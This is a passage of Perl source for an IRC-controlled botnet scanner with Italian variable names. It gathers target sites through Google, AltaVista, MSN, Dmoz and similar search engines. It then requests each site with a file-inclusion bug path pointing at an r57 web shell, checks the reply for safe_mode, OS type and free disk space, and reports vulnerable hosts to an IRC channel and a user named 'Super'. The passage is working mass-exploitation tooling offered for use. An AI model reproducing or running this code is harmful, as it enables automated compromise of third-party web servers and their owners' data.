+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su SpecialNo");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su SpecialNo");
+}}
+}}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @eurofrlist=&eurofr($chiave);
+push(my @tot, @eurofrlist);
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13SpecialFr7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9SpecialFr Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13SpecialFr Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su SpecialFr");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su SpecialFr");
+}}
+}}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @euronllist=&euronl($chiave);
+push(my @tot, @euronllist);
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13SpecialNl7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9SpecialNl Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13SpecialNl Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su SpecialNl");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su SpecialNl");
+}}
+}}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @europllist=&europl($chiave);
+push(my @tot, @europllist);
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13SpecialPl7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9SpecialPl Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13SpecialPl Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su SpecialPl");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su SpecialPl");
+}}
+}}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @eurorulist=&euroru($chiave);
+push(my @tot, @eurorulist);
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13SpecialRu7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9SpecialRu Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13SpecialRu Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su SpecialRu");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su SpecialRu");
+}}
+}}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @eurofilist=&eurofi($chiave);
+push(my @tot, @eurofilist);
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13SpecialFi7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9SpecialFi Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13SpecialFi Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su SpecialFi");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su SpecialFi");
+}}
+}}}
+exit;
+}}
+ 
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @zizuplist=&zizup($chiave);
+push(my @tot, @zizuplist);
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Zizup7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9Zizup Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13Zizup Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Zizup");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Zizup");
+}}
+}}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @ybypasslist=&ybypass($chiave);
+push(my @tot, @ybypasslist);
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Ybypass7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9Ybypass Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13Ybypass Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Ybypass");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Ybypass");
+}}
+}}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @dmozlist=&dmoz($chiave);
+push(my @tot, @dmozlist);
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Dmoz7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9Dmoz Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13Dmoz Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Dmoz");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Dmoz");
+}}
+}}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @einetlist=&einet($chiave);
+push(my @tot, @einetlist);
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13Einet7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9Einet Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13Einet Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Ybypass");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su Ybypass");
+}}
+}}}
+exit;
+}}
+ 
+if ($line=~ /PRIVMSG $canale :$start\s+(.*?)\s+(.*)/){
+if (my $pid = fork) {
+waitpid($pid, 0);
+} else {
+if (fork) {
+exit;
+} else {
+my $bug=$1;
+my $chiave=$2;
+my $contatore=0;
+my ($type,$space);
+my %hosts;
+my @webdelist=&webde($chiave);
+push(my @tot, @webdelist);
+my @puliti = &unici(@tot);
+scrivi($sk, "PRIVMSG $canale :15(7@11Scan15)(13WebDe7:12".scalar(@tot)." Puliti ".scalar(@puliti)." Siti con 13 $chiave)");
+my $uni=scalar(@puliti);
+foreach my $sito (@puliti)
+{
+$contatore++;
+if ($contatore %100==0){
+scrivi($sk, "PRIVMSG $canale :9WebDe Testati ".$contatore." su ".$uni. " siti");
+}
+if ($contatore==$uni-1){
+scrivi($sk, "PRIVMSG $canale :13WebDe Finito $chiave");
+}
+my $test="http://".$sito.$bug.$id."?";
+my $print="http://".$sito.$bug.$r57."?";
+my $req=HTTP::Request->new(GET=>$test);
+my $ua=LWP::UserAgent->new();
+$ua->timeout(5);
+my $response=$ua->request($req);
+if ($response->is_success) {
+my $re=$response->content;
+if($re =~ /safe_mode: <b><font color=red>OFF</){
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su WebDe");
+scrivi($sk, "PRIVMSG Super :4SafeMode(7 OFF ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print");
+}}
+elsif($re =~ /safe_mode: <b><font color=green>ON</)
+{
+my $hs=geths($print); $hosts{$hs}++;
+if($hosts{$hs}=="1"){
+$x=os($test);
+($type,$space)=split(/\,/,$x);
+scrivi($sk, "PRIVMSG $canale :4SafeMode(7 ON ) 9Sys(11 $type ) 15Free(8 $space ) 13 $print 11Su WebDe");
+}}
+}}}
+exit;
+}}}
+ 
+ 
+ 
+sub scrivi()
+{
+if ($#_ == '1') {
+my $sk = $_[0];
+print $sk "$_[1]\n";
+} else {
+print $sk "$_[0]\n";
+}}
+ 
+sub os(){
+my $sito=$_[0];
+my $Res=query($sito);
+my $type;
+my $free;
+my $str;
+while($Res=~m/<br>OSTYPE:(.+?)\<br>/g){
+$type=$1;
+}
+while($Res=~m/<br>Free:(.+?)\<br>/g){
+$free=$1;
+}
+$str=$type.",".$free;
+return $str;
+}
+ 
+sub googlet {
+my @dominios = ("ae","com.ar","at","com.au","be","com.br","ca","ch","cl","de","dk","pt","it","co.uk","es");
+my @country = ("AT","AU","BR","tw","jp","pl","ar","info","biz","cz","dk","mx","sk","pe","ee","fi","pt","se","es");
+my @lang = ("en","es","de","nl","ro","it","be","fo","sv","fr","el","pt");
+my @lst;
+my $key=key($_[0]);
+my $c=0;
+foreach my $i (@dominios){
+my @lista = google($i,$key,$lang[$c],$country[$c]);
+push(@lst,@lista);
+$c++;
+}
+return @lst;
+}
+ 
+sub google(){
+my @lst;
+my $i=$_[0];
+my $key=$_[1];
+my $lang= $_[2];
+my $country =$_[3];
+for($b=0;$b<=5000;$b+=100){
+my $Go=("www.google.".$i."/search?hl=".$lang."&q=".key($key)."&num=100&start=".$b."&meta=cr%3Dcountry".$country);
+my $Res=query($Go);
+while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
+if ($1 !~ /google/){
+my $k=$1;
+my @grep=links($k);
+push(@lst,@grep);
+}}}
+return @lst;
+}
+ 
+sub guk(){
+my @lst;
+my $key = $_[0];
+for($b=0;$b<=1000;$b+=100){
+my $Go=("http://www.google.co.uk/search?hl=gb&q=".key($key)."&num=100&&hl=en&cr=countryUK|countryGB&start=".$b);
+my $Res=query($Go);
+while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
+if ($1 !~ /google/){
+my $k=$1;
+my @grep=links($k);
+push(@lst,@grep);
+}}}
+return @lst;
+}
+ 
+sub gde(){
+my @lst;
+my $key = $_[0];
+for($b=0;$b<=1000;$b+=100){
+my $Go=("http://www.google.de/search?hl=gb&q=".key($key)."&num=100&&hl=en&cr=countryDE|countryDE&start=".$b);
+my $Res=query($Go);
+while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
+if ($1 !~ /google/){
+my $k=$1;
+my @grep=links($k);
+push(@lst,@grep);
+}}}
+return @lst;
+}
+ 
+sub gnl(){
+my @lst;
+my $key = $_[0];
+for($b=0;$b<=1000;$b+=100){
+my $Go=("http://www.google.nl/search?hl=nl&q=".key($key)."&num=100&&hl=en&cr=countryNL|countryNL&start=".$b);
+my $Res=query($Go);
+while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
+if ($1 !~ /google/){
+my $k=$1;
+my @grep=links($k);
+push(@lst,@grep);
+}}}
+return @lst;
+}
+ 
+sub gru(){
+my @lst;
+my $key = $_[0];
+for($b=0;$b<=1000;$b+=100){
+my $Go=("http://www.google.ru/search?hl=ru&q=".key($key)."&num=100&&hl=en&cr=countryRU|countryRU&start=".$b);
+my $Res=query($Go);
+while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
+if ($1 !~ /google/){
+my $k=$1;
+my @grep=links($k);
+push(@lst,@grep);
+}}}
+return @lst;
+}
+ 
+sub git(){
+my @lst;
+my $key = $_[0];
+for($a=0;$a<=1000;$a+=100){
+my $Go=("http://www.google.it/search?q=".key($key)."&num=100&hl=it&as_qdr=all&start=".$a."&sa=N");
+my $Res=query($Go);
+while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
+if ($1 !~ /google/){
+my $k=$1;
+my @grep=links($k);
+push(@lst,@grep);
+}}}
+return @lst;
+}
+ 
+ 
+sub gat(){
+my @lst;
+my $key = $_[0];
+for($b=0;$b<=1000;$b+=100){
+my $Go=("http://www.google.at/search?hl=at&q=".key($key)."&num=100&&hl=en&cr=countryAT|countryAT&start=".$b);
+my $Res=query($Go);
+while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
+if ($1 !~ /google/){
+my $k=$1;
+my @grep=links($k);
+push(@lst,@grep);
+}}}
+return @lst;
+}
+ 
+sub ges(){
+my @lst;
+my $key = $_[0];
+for($b=0;$b<=1000;$b+=100){
+my $Go=("http://www.google.es/search?hl=es&q=".key($key)."&num=100&&hl=en&cr=countryES|countryES&start=".$b);
+my $Res=query($Go);
+while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
+if ($1 !~ /google/){
+my $k=$1;
+my @grep=links($k);
+push(@lst,@grep);
+}}}
+return @lst;
+}
+ 
+sub altavista() {
+    my @lst;
+    my $key  = $_[0];
+    my $name = $_[1];
+    for ($b = 1;$b <= 1000;$b += 10) {
+        my $Alt = ( "http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=". key($key) . "&stq=". $b );
+        my $re = query($Alt);
+        while ( $re =~ m/<span class=ngrn>(.+?)\//g ) {
+            if ( $1 !~ /altavista/ ) {
+                my $k = $1;
+                $k =~ s/<//g;
+                $k =~ s/ //g;
+                my @grep = links($k);
+                open( $filez, ">>", $name );
+                foreach my $k (@grep) {
+                    print $filez "$k\n";
+                }
+                close $filez;
+                push( @lst, @grep );
+            }
+        }
+        if ( $re =~ /target=\"_self\">Succ/ ) { }
+        else {
+            return @lst;
+        }
+    }
+    return @lst;
+}
+ 
+ 
+sub altavistade(){
+my @lst;
+my $key = $_[0];
+for($b=1;$b<=1000;$b+=10){
+my $AlT=("http://de.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
+my $Res=query($AlT);
+while($Res=~m/<span class=ngrn>(.+?)\//g){
+if($1 !~ /altavista/){
+my $k=$1;
+$k=~s/<//g;
+$k=~s/ //g;
+my @grep=links($k);
+push(@lst,@grep);
+}}}
+return @lst;
+}
+ 
+sub altavistaus(){
+my @lst;
+my $key = $_[0];
+for($b=1;$b<=1000;$b+=10){
+my $AlT=("http://us.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
+my $Res=query($AlT);
+while($Res=~m/<span class=ngrn>(.+?)\//g){
+if($1 !~ /altavista/){
+my $k=$1;
+$k=~s/<//g;
+$k=~s/ //g;
+my @grep=links($k);
+push(@lst,@grep);
+}}}
+return @lst;
+}
+ 
+ 
+sub searchs() {
+my @lst;
+my $key = $_[0];
+for($b=0;$b<=1000;$b+=100){
+my $ser=("http://www.search.com/search?q=".key($key)."".$b);
+my $Res=query($ser);
+while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
+if ($1 !~ /msn|live|google|yahoo/){
+my $k=$1;
+my @grep=links($k);
+push(@lst,@grep);
+}}}
+return @lst;
+}
+ 
+ 
+sub msn() {
+    my @lst;
+    my $key  = $_[0];
+    my $name = $_[1];
+    for ( $b = 1 ; $b <= 1000 ; $b += 10 ) {
+        my $Msn = ( "http://search.live.com/results.aspx?q=". key($key). "&first=". $b. "&FORM=PERE" );
+        my $re = query($Msn);
+        while ( $re =~ m/<a href=\"?http:\/\/([^>\"]*)\//g ) {
+            if ( $1 !~ /msn|live/ ) {
+                my $k    = $1;
+                my @grep = links($k);
+                open( $filez, ">>", $name );
+                foreach my $k (@grep) {
+                    print $filez "$k\n";
+                }
+                close $filez;
+                push( @lst, @grep );
+            }
+        }
+    }
+    return @lst;
+}
+ 
+sub msnde() {
+    my @lst;
+    my $key  = $_[0];
+    my $name = $_[1];
+    for ( $b = 1 ; $b <= 1000 ; $b += 10 ) {
+        my $Msn = ( "http://search.live.com/results.aspx?q=".key($key)."&go=&first=".$b."=Rechercher&mkt=de-de&scope=&FORM=PERE" );
+        my $re = query($Msn);
+        while ( $re =~ m/<a href=\"?http:\/\/([^>\"]*)\//g ) {
+            if ( $1 !~ /msn|live/ ) {
+                my $k    = $1;
+                my @grep = links($k);
+                open( $filez, ">>", $name );
+                foreach my $k (@grep) {
+                    print $filez "$k\n";
+                }
+                close $filez;
+                push( @lst, @grep );
+            }
+        }
+    }
+    return @lst;
+}
+ 
+sub msnno() {
+    my @lst;
+    my $key  = $_[0];
+    my $name = $_[1];
+    for ( $i = 1 ; $i <= 1000 ; $i += 10 ) {
+        my $Msn = ( "http://search.msn.no/results.aspx?q=".key($key)."&CP=65001&first=".$i."&FORM=PERE" );
+        my $re = query($Msn);
+        while ( $re =~ m/<a href=\"?http:\/\/([^>\"]*)\//g ) {
+            if ( $1 !~ /msn|live/ ) {
+                my $k    = $1;
+                my @grep = links($k);
+                open( $filez, ">>", $name );
+                foreach my $k (@grep) {
+                    print $filez "$k\n";
+                }
+                close $filez;
+                push( @lst, @grep );
+            }
+        }
+    }
+    return @lst;
+}
+ 
+sub msnuk() {
+    my @lst;
+    my $key  = $_[0];
+    my $name = $_[1];
